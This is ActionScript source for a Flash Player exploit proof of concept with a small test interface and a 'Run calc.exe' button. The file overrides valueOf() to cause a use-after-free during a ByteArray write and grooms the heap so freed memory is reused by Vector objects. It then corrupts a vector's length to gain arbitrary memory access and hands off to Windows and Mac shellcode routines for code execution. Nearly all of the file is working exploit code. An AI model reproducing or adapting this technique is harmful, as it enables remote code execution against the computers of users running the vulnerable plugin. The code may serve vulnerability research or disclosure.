package
{
	import flash.display.DisplayObjectContainer;
	import fl.controls.Button;
	import fl.controls.TextArea;
	import flash.utils.ByteArray;
	import flash.system.Capabilities;
	import flash.events.MouseEvent;
	import flash.external.ExternalInterface;
	
	
	public class MyClass
	{
		static var 
			_log:TextArea,
			_gc:Array, 
			_va:Array,
			_ba:ByteArray,
			_isDbg:Boolean = Capabilities.isDebugger;
	
		// prints text message into the text area
		static function logAdd(str:String):void
		{
			_log.htmlText += "<pre>" + str;
		}
		
		// define malicious valueOf()
		prototype.valueOf = function ()
		{
			logAdd("MyClass.valueOf()");
			
			_va = new Array(5);
			_gc.push(_va); // protect from GC // for RnD
			
			// reallocate _ba storage
			_ba.length = 0x1100;
			
			// reuse freed memory
			for(var i:int; i < _va.length; i++)
				_va[i] = new Vector.<uint>(0x3f0);
			
			// return one byte for overwriting
			return 0x40;
		}
		
		// try to corrupt the length value of Vector.<uint>
		static function TryExpl() : Boolean
		{
			try
			{
				var alen:int = 90; // should be multiply of 3
				var a = new Array(alen);
				if (_gc == null) _gc = new Array();
				_gc.push(a); // protect from GC // for RnD
				
				// try to allocate two sequential pages of memory: [ ByteArray ][ MyClass2 ]
				for(var i:int; i < alen; i+=3){
					a[i] = new MyClass2(i);
					
					a[i+1] = new ByteArray();
					a[i+1].length = 0xfa0;
					
					a[i+2] = new MyClass2(i+2);
				}
				
				// find these pages
				var v:Vector.<uint>;
				for(i=alen-5; i >= 0; i-=3)
				{
					// take next allocated ByteArray
					_ba = a[i];
					// call valueOf() and cause UaF memory corruption 
					_ba[3] = new MyClass();
					// _ba[3] should be unchanged 0
					logAdd("_ba[3] = " + _ba[3]);
					if (_ba[3] != 0) throw new Error("can't cause UaF");
					
					// check results // find corrupted vector
					for(var j:int=0; j < _va.length; j++){
						v = _va[j];
						if (v.length != 0x3f0) {
							logAdd("v.length = 0x" + v.length.toString(16));
							
							// check the [ MyClass2 ] presence after [ ByteArray ]
							var k:int = 0x400 + 70;
							if (v[k] == 0x11223344) {
								// ok, scroll k to mc.a0
								do k-- while (v[k] == 0x11223344);
								var mc:MyClass2 = a[v[k]];
								mc.length = 0x123;
								
								//logAdd("k = " + (k - 0x400) + ", mc = " + MyUtils.ToStringV(v, 0x400, 64));
								
								//check for x64 and proceed to payload execution
								if ((k - 0x400) > 40) {
									if (MyUtils.isWin()) {
										if (ShellWin64.Init(v, 0x1000, mc, k-8)) ShellWin64.Exec() else logAdd("Fail.");
									}else
									if (MyUtils.isMac()) {
										if (ShellMac64.Init(v, 0x1000, mc, k-8)) ShellMac64.Exec() else logAdd("Fail.");
									}else
										logAdd("todo: unsupported x64 os");
								} else {
									if (MyUtils.isWin()) {
										if (ShellWin32.Init(v, (v[k-4] & 0xfffff000) - 0x1000 + 8, mc, k-4)) ShellWin32.Exec() else logAdd("Fail.");
									}else
										logAdd("todo: unsupported x86 os");
								}
								
								logAdd("v.length = 0x" + v.length.toString(16));
								return true;
							}
							
							logAdd("bad MyClass2 allocation.");
							break;
						}
					}
				}
				
				logAdd("bad allocation. try again.");
			}
			catch (e:Error) 
			{
				logAdd("TryExpl() " + e.toString());
			}
			
			return false;
		}
		
		// 
		static function btnClickHandler(e:MouseEvent):void 
		{
			try
			{	
				logAdd("===== start =====");
				
				// try to exploit
				TryExpl();
				
				logAdd("=====  end  =====");
			}
			catch (e:Error) 
			{
				logAdd(e.toString());
			}
		}
		
		// init GUI elements
		static public function InitGui(doc: DisplayObjectContainer)
		{
			try
			{
				// add text area
				_log = new TextArea(); 
				_log.move(20,2);
				_log.setSize(560, 360); 
				_log.condenseWhite = true; 
				_log.editable = false;
				doc.addChild(_log);
				
				// add the button
				var btn:Button = new Button();
				btn.label = "Run" + (MyUtils.isWin() ? " calc.exe":"");
				btn.move(220, 370);
				btn.setSize(160,26);
				btn.addEventListener(MouseEvent.CLICK, btnClickHandler);
				doc.addChild(btn);
			
				// print environment info
				logAdd("Flash: " + Capabilities.version + (Capabilities.isDebugger ? " Debug":"")
						+ " " + Capabilities.cpuArchitecture + (is32() ? "-32" : is64() ? "-64":"") + " " + Capabilities.playerType);
				logAdd("OS: " + Capabilities.os  + (Capabilities.supports64BitProcesses ? " 64-bit":" 32-bit"));
			
				if (ExternalInterface.available)
					logAdd("Browser: " + callJS("getEnvInfo"));
			}
			catch (e:Error) 
			{
				logAdd("InitGui() " + e.toString());
			}
		}
		
		// calls JavaScript function
		static function callJS(func:String):String 
		{
			try
			{
				if (ExternalInterface.available)
					return "" + ExternalInterface.call(func);
			}
			catch (e:Error) 
			{
			}
			return "";
		}
		
		// checks for x32/x64 platform
		static var _platform:String;
		
		static function is32():Boolean
		{
			var x64:Boolean = Capabilities.supports64BitProcesses;
			if (x64 && MyUtils.isWin()) {
				// FP can be 32-bit on Windows x64
				if (_platform == null) _platform = callJS("getPlatform");
				return _platform.search("32") >= 0;
			}
			return !x64;
		}
		
		static function is64():Boolean
		{
			var x64:Boolean = Capabilities.supports64BitProcesses;
			if (x64 && MyUtils.isWin()) {
				// FP can be 32-bit on Windows x64
				if (_platform == null) _platform = callJS("getPlatform");
				return _platform.search("64") >= 0;
			}
			return x64;
		}
	}

}